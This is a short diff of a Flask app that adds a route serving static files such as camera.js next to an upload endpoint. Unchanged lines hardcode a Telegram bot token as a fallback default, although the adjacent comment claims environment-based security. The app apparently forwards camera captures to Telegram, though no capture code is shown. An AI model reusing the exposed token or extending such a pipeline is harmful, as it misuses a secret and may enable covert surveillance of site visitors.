@@ -1,10 +1,10 @@
 import os
 import io
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, send_from_directory
 from werkzeug.utils import secure_filename
 import httpx
 
-app = Flask(__name__)
+app = Flask(__name__, static_folder='static')
 
 # استخراج التوكن ومعرف الشات من متغيرات البيئة لضمان الأمان
 TOKEN = os.getenv('TELEGRAM_TOKEN','8619489316:AAGVG6IrKXWUFaleUS0KFh113d0U31CYL74')
@@ -17,6 +17,11 @@ def index():
             return f.read()
     except FileNotFoundError:
         return jsonify({"error": "index.html not found"}), 404
+
+# مسار مخصص لجلب ملفات الـ static (مثل camera.js) بنجاح
+@app.route('/static/<path:filename>')
+def serve_static(filename):
+    return send_from_directory(app.static_folder, filename)
 
 @app.route('/upload', methods=['POST'])
 def upload():
